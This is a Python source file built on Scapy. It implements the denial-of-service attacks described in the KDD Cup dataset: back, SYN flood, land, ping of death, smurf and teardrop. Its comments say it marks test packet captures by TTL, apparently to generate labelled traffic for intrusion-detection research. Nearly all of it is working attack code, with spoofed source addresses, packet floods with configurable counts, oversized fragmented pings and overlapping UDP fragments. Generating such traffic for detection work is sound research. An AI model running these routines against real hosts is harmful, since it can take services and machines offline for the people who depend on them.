# This is all the Denial of service attacks that are described in the the
# KDD Cup Data Set
# As the KDD Cup does NOT use TTL, I will use that to "label" Test PCAPs
# This will increase by increments of 10....
from scapy.all import *
from datetime import datetime
# Potential good read for future
# https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html


# Denial of service attack against apache web server where a client
# requests a URL containing many backslashes
# Can just try the HTTP LIB to use this for us?
def back(target_ip, payload, target_port=80, src_ip="192.168.147.150", naive=True):
    print("Executing back at: " + str(datetime.now()))
    # Given a URL, attempt to go into root? If failed at attempt 1, don't try anymore?
    if naive:
        i = IP(src=src_ip, dst=target_ip)
        t = TCP(flags="S", dport=int(target_port), sport=RandShort())
        back_attack = i / t
        replies = sr(back_attack / Raw(load=payload), verbose=False, timeout=3)
    else:
        i = IP(src=src_ip, dst=target_ip)
        t = TCP(dport=int(target_port), sport=RandShort())
        back_attack = i / t
        replies = sr(back_attack / Raw(load=payload), verbose=False, timeout=3, inter=1./20)
    # for packet in replies:
    #    print(packet)


# SYN flood denial of service on one or more ports - Neptune
# You can use the id and ttl fields to help hide the identity of the attacker
def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=1000, naive=True):
    print("Executing SYN Flood at: " + str(datetime.now()))
    if naive:
        # Creates the packet and assigns it to variable a
        a = IP(src=src_ip, dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
        send(a / str('X' * 54540), verbose=False, timeout=2, count=packets_send)
    else:
        a = IP(src=src_ip, dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
        send(a, verbose=False, count=packets_send, inter=1)
    # another way to do this is to use
    # ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)
    # ans.summary()
    # unans.summary()


# Denial of service where a remote host is sent a UDP packet with the
# same source and destination
def land(target_ip, target_port, packets_send=1000, naive=True):
    print("Executing land at: " + str(datetime.now()))
    if naive:
        i = IP(src=target_ip, dst=target_ip)
        u = UDP(sport=int(target_port), dport=int(target_port))
        send(i / u, verbose=False, count=packets_send, inter=1)
    else:
        i = IP(src=target_ip, dst=target_ip)
        u = UDP(sport=int(target_port), dport=int(target_port))
        send(i / u, verbose=False, count=packets_send, inter=1)
    print("Land attack complete!")


# Denial of service ping of death
# Send a malicious ping to another computer that exceeds that maximum IPv4
# packet size which is 65,535 bytes
def pod(target_ip, src_ip="192.168.147.154", naive=True):
    print("Executing pod at: " + str(datetime.now()))
    if naive:
        i = IP(src=src_ip, dst=target_ip)
        f = fragment(i/ICMP()/(str('X' * 60000)))
        send(f, verbose=False)
    else:
        i = IP(src=src_ip, dst=target_ip)
        f = fragment(i/ICMP()/(str('X' * 60000)))
        send(f, verbose=False, inter=1)


# Denial of service icmp echo reply flood
def smurf(source_ip, target_ip, packets_send=1000, naive=True):
    print("Executing smurf at: " + str(datetime.now()))
    if naive:
        send(IP(src=source_ip, dst=target_ip, ttl=50) / ICMP(), verbose=False, count=packets_send)
    else:
        send(IP(src=source_ip, dst=target_ip, ttl=50) / ICMP(), verbose=False, count=packets_send, inter=1)
    print("Smurf attack complete!")


# Denial of service where mis-fragmented UDP packets cause some
# systems to reboot
# Code taken from:
# https://samsclass.info/123/proj10/teardrop.htm
def teardrop(target, attack, src_ip="192.168.147.153", naive=True):
    """
    print('Attacking target ' + target + ' with attack ' + attack)
    print("   Attack Codes:                                           ")
    print("   0: small payload (36 bytes), 2 packets, offset=3x8 bytes")
    print("   1: large payload (1300 bytes), 2 packets, offset=80x8 bytes")
    print("   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes")
    print("   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes")
    print("   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes")
    """
    print("Executing teardrop at: " + str(datetime.now()))

    if attack == '0':
        print("Using attack 0")
        size = 36
        load1 = "\x00" * size

        i = IP(ttl=60, dst=target, flags="MF", proto=17, src=src_ip)
        size = 4
        offset = 18
        load2 = "\x00" * size

        j = IP(ttl=60, dst=target, flags=0, proto=17, frag=offset, src=src_ip)
        send(i / load1, verbose=False)
        send(j / load2, verbose=False)

    elif attack == '1':
        print("Using attack 1")
        size = 1300
        offset = 80
        load = "A" * size

        i = IP(ttl=60, dst=target, flags="MF", proto=17, src=src_ip)
        j = IP(ttl=60, dst=target, flags=0, proto=17, frag=offset, src=src_ip)
        send(i / load, verbose=False)
        send(j / load, verbose=False)

    elif attack == '2':
        print("Attacking with attack 2")
        size = 1300
        offset = 80
        load = "A" * size

        i = IP(ttl=60, dst=target, proto=17, flags="MF", frag=0, src=src_ip)
        send(i / load)

        # print("Attack 2 packet 0")

        for x in range(1, 10):
            i.frag = offset
            offset = offset + 80
            send(i / load, verbose=False)
            # print("Attack 2 packet " + str(x))

        i.frag = offset
        i.flags = 0
        send(i / load, verbose=False)

    elif attack == '3':
        print("Using attack 3")
        size = 1336
        load1 = "\x00" * size

        i = IP(ttl=60, dst=target, flags="MF", proto=17, src=src_ip)
        size = 4
        offset = 18
        load2 = "\x00" * size
        j = IP(ttl=60, dst=target, flags=0, proto=17, frag=offset, src=src_ip)
        send(i / load1, verbose=False)
        send(j / load2, verbose=False)

    else:  # attack == 4
        print("Using attack 4")
        size = 1300
        offset = 10
        load = "A" * size
        i = IP(ttl=60, dst=target, flags="MF", proto=17, src=src_ip)
        j = IP(ttl=60, dst=target, flags=0, proto=17, frag=offset, src=src_ip)
        send(i / load, verbose=False)
        send(j / load, verbose=False)

    print("Done Executing Teardrop!!")


